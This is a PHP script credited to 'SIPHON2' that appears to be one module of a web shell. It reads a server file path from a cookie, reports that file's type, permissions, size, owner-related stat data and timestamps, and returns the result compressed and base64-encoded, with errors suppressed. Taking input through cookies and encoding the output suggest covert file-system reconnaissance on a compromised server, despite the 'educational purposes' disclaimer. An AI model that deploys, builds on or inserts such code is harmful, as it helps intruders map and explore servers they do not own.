<?php
/*
*     Copyright (c) 2023 SIPHON2
*     All rights reserved.
*    
*     This PHP script, including any associated documentation or files,
*     is the intellectual property of SIPHON2 and is protected by
*     international copyright laws and treaties. Unauthorized copying,
*     distribution, or reproduction of this script, or any portion
*     thereof, is strictly prohibited and may result in severe civil
*     and criminal penalties, as well as liability for monetary damages.
*    
*     You may not use, modify, adapt, merge, sublicense, rent, lease,
*     loan, sell, or otherwise exploit this script without prior
*     written permission from SIPHON2.
*    
*     You are granted a non-exclusive, non-transferable, limited license
*     to use this script solely for non-commercial purposes or for
*     evaluation purposes with the intent to purchase a commercial
*     license. Any use of this script for commercial purposes without
*     a valid commercial license is expressly prohibited.
*    
*     This script is provided "as is" without any warranties of any kind,
*     whether express or implied. SIPHON2 shall not be liable for any
*     damages, including but not limited to, direct, indirect, special,
*     incidental, or consequential damages or loss of data, even if
*     advised of the possibility of such damages.
*    
*     For inquiries regarding licensing or to obtain written permission
*     to use this script for any purpose not expressly permitted in this
*     notice, please contact SIPHON2 at siphon4545@gmail.com.
*
*
*
*
*
*
*     ---------------------------------------------------------------------------

*     #######################################
*     ##  READ CAREFULLY BEFORE PROCEED!!! ##
*     #######################################

*     This PHP script is intended solely for educational purposes.
*     It is meant to be used as a learning resource and for understanding
*     specific concepts.
*    
*     WARNING: Use this script responsibly and at your own risk. The author
*     (SIPHON2) of this script shall not be liable for any direct, indirect,
*     special, incidental, or consequential damages arising from the use or
*     misuse of this script. The users of this script are solely responsible
*     for any consequences that may occur while using this script. Think twice
*     about the potential consequences and ensure that you have proper
*     authorization before using any part of this script in any environment.
*    
*     By using this script, you agree to accept all risks and responsibilities
*     associated with its usage. If you do not agree with these terms, do not
*     proceed to use this script.
*    
*     Please be reminded that you, and only you, are solely responsible for your
*     actions. Always adhere to responsible and ethical coding practices, and
*     ensure to obtain proper authorization before running any script in a live
*     or production environment.

*     YOUR ACTIONS CARRY CONSEQUENCES, SO THINK TWICE BEFORE PROCEEDING.
*     
*     ---------------------------------------------------------------------------
*     
*     GET ALL THE ATTRIBUTES OF A GIVEN PATH
*     
*/




$start = microtime(true);

$arguments = [
    'level' => isset($_COOKIE["level"]) ? (int)$_COOKIE["level"] : 9,
    'path' => isset($_COOKIE["path"]) ? $_COOKIE["path"] : null
];


function ATTRIBUTES()
{
    global $arguments, $start;
    extract($arguments, EXTR_SKIP);
    $result = []; $debug = []; $info = []; $result['status'] = false;
    if (!file_exists($path)) {array_push($debug, ["error" => "path"]);}
    else
    {
        $result['status'] = true;
        $stat = (object)stat($path);
        $info['name'] = basename($path);
        $info['type'] = is_link($path) ? 'symlink' : (is_file($path) ? 'file' : (is_dir($path) ? 'dir' : 'unknown'));
        if ($info['type'] == 'symlink')
        {
            $info['dest'] = readlink($path);
        }
        $info['mime'] = mime_content_type($path);
        if ($info['mime'] != 'directory')
        {
            $info['exec'] = is_executable($path);
        }
        $info['size'] = $stat->size;
        $info['perms'] = fileperms($path);
        // $info['owner'] = (PHP_OS === 'WIN32' || PHP_OS === 'WINNT') ? null : posix_getpwuid($stat->uid)['name'];
        // $info['group'] = (PHP_OS === 'WIN32' || PHP_OS === 'WINNT') ? null : posix_getgrgid($stat->gid)['name'];
        $info['atime'] = $stat->atime;  // date('D d M Y H:i:s A', $stat->atime)
        $info['ctime'] = $stat->ctime;
        $info['mtime'] = $stat->mtime;
    }
    $result['time'] = microtime(true)-$start;
    $result['debug'] = $debug;
    $result['operation'] = [
        'action' => __FUNCTION__,
        'arguments' => $arguments
    ];
    $result['data'] = $info;
    $response = json_encode($result, JSON_UNESCAPED_UNICODE);

    echo trim(base64_encode(gzdeflate($response, $level)), '=');
    // echo $response;
}

@ATTRIBUTES();


?>
